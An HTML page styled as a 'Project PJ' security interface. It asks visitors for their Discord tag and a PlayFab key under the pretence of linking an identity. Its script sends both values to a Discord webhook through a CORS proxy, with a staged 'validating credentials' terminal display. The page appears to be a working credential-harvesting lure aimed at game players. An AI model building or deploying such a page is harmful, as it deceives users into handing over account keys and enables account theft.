<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PROJECT PJ | The Link</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #5865F2; 
            --primary-hover: #4752C4;
            --accent: #00ff88;
            --accent-glow: rgba(0, 255, 136, 0.5);
            --danger: #ff4444;
            --bg: #050505;
            --surface: rgba(15, 15, 20, 0.85);
            --border: rgba(255, 255, 255, 0.1);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Rajdhani', sans-serif;
            background-color: var(--bg);
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            overflow: hidden;
        }

        /* Cyber Grid Background */
        .bg-grid {
            position: fixed;
            top: 0; left: 0; width: 100vw; height: 100vh;
            background-image: 
                linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
            background-size: 30px 30px;
            z-index: -1;
        }

        .container {
            width: 100%;
            max-width: 450px;
            padding: 20px;
        }

        .header-box { text-align: center; margin-bottom: 2rem; }

        h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 2.5rem;
            letter-spacing: 5px;
            text-shadow: 0 0 15px rgba(255,255,255,0.5);
        }

        .subtitle {
            color: var(--accent);
            letter-spacing: 3px;
            font-size: 0.8rem;
            font-weight: 700;
        }

        #clock {
            font-family: 'Orbitron', monospace;
            font-size: 0.75rem;
            color: #888;
            margin-top: 5px;
        }

        .card {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 2rem;
            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
            backdrop-filter: blur(10px);
        }

        .btn-discord {
            background: var(--primary);
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            padding: 1rem;
            border-radius: 6px;
            text-decoration: none;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: 0.3s;
            margin-bottom: 1.5rem;
            width: 100%;
        }
        .btn-discord:hover { background: var(--primary-hover); }

        .input-group { margin-bottom: 1.2rem; }
        
        label {
            display: block;
            font-size: 0.75rem;
            color: #aaa;
            margin-bottom: 5px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        input {
            width: 100%;
            padding: 12px;
            background: rgba(0,0,0,0.5);
            border: 1px solid var(--border);
            border-radius: 6px;
            color: #fff;
            font-family: 'Orbitron', sans-serif;
            font-size: 0.9rem;
            transition: 0.3s;
            outline: none;
        }

        input:focus {
            border-color: var(--accent);
            box-shadow: 0 0 10px var(--accent-glow);
        }

        .btn-submit {
            width: 100%;
            padding: 1rem;
            background: var(--accent);
            color: #000;
            border: none;
            border-radius: 6px;
            font-family: 'Orbitron', sans-serif;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
            transition: 0.3s;
            text-transform: uppercase;
            margin-top: 10px;
        }

        .btn-submit:hover:not(:disabled) {
            box-shadow: 0 0 15px var(--accent-glow);
            transform: translateY(-2px);
        }

        .btn-submit:disabled {
            background: #333;
            color: #666;
            cursor: not-allowed;
        }

        /* Terminal Output Box */
        .terminal {
            margin-top: 1.5rem;
            background: #000;
            border: 1px solid #333;
            border-radius: 6px;
            padding: 10px;
            height: 100px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 0.75rem;
            color: #aaa;
            display: none;
        }
        
        .terminal p { margin: 2px 0; }
        .log-success { color: var(--accent); }
        .log-error { color: var(--danger); }
        .log-warn { color: yellow; }

    </style>
</head>
<body>
    <div class="bg-grid"></div>

    <div class="container">
        <div class="header-box">
            <h1>PROJECT PJ</h1>
            <div class="subtitle">SECURITY INTERFACE V.2.06</div>
            <div id="clock">SYS.TIME: 00:00:00</div>
        </div>

        <div class="card">
            <a href="https://discord.gg/YvAbSsEUfN" target="_blank" class="btn-discord">
                <i class="fab fa-discord"></i> Connect Identity
            </a>

            <form id="linkForm">
                <div class="input-group">
                    <label>Discord Tag</label>
                    <input type="text" id="discord" placeholder="Username#0000" required>
                </div>
                <div class="input-group">
                    <label>PlayFab Key</label>
                    <input type="text" id="playfab" placeholder="ENTER KEY" required>
                </div>
                <button type="submit" class="btn-submit" id="submitBtn">
                    <i class="fas fa-link"></i> Execute Link
                </button>
            </form>

            <div class="terminal" id="terminal"></div>
        </div>
    </div>

    <script>
        // Live Clock
        setInterval(() => {
            const now = new Date();
            document.getElementById('clock').innerText = `SYS.TIME: ${now.toLocaleTimeString()}`;
        }, 1000);

        const form = document.getElementById('linkForm');
        const submitBtn = document.getElementById('submitBtn');
        const terminal = document.getElementById('terminal');

        function log(msg, type = '') {
            terminal.style.display = 'block';
            const p = document.createElement('p');
            p.innerHTML = `> ${msg}`;
            if(type) p.className = `log-${type}`;
            terminal.appendChild(p);
            terminal.scrollTop = terminal.scrollHeight;
        }

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const discord = document.getElementById('discord').value.trim();
            const playfab = document.getElementById('playfab').value.trim();

            // Reset Terminal
            terminal.innerHTML = '';
            submitBtn.disabled = true;

            log('INITIALIZING SECURE UPLINK...');
            
            // This MUST be replaced by your GitHub Action
            const rawWebhook = "REPLACE_WITH_WEBHOOK";

            if (rawWebhook.includes("REPLACE_WITH")) {
                log('FATAL: WEBHOOK NOT INJECTED BY GITHUB ACTIONS.', 'error');
                submitBtn.disabled = false;
                return;
            }

            // Route through CORS Proxy to bypass Discord browser block
            const proxiedWebhook = `https://corsproxy.io/?${encodeURIComponent(rawWebhook)}`;

            const payload = {
                embeds: [{
                    title: "ðŸ” System Authorization Request",
                    color: 65280,
                    fields: [
                        { name: "Discord", value: "`" + discord + "`", inline: true },
                        { name: "PlayFab", value: "`" + playfab + "`", inline: true }
                    ],
                    footer: { text: "PJ Security System" },
                    timestamp: new Date().toISOString()
                }]
            };

            setTimeout(async () => {
                log('VALIDATING CREDENTIALS...', 'warn');
                try {
                    const res = await fetch(proxiedWebhook, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });

                    if (res.ok) {
                        log('UPLINK SUCCESSFUL. DATA TRANSMITTED.', 'success');
                        form.reset();
                    } else {
                        throw new Error(`HTTP ${res.status}`);
                    }
                } catch (err) {
                    log(`TRANSMISSION FAILED: ${err.message}`, 'error');
                } finally {
                    submitBtn.disabled = false;
                }
            }, 800); // Fake delay for cool terminal effect
        });
    </script>
</body>
</html>
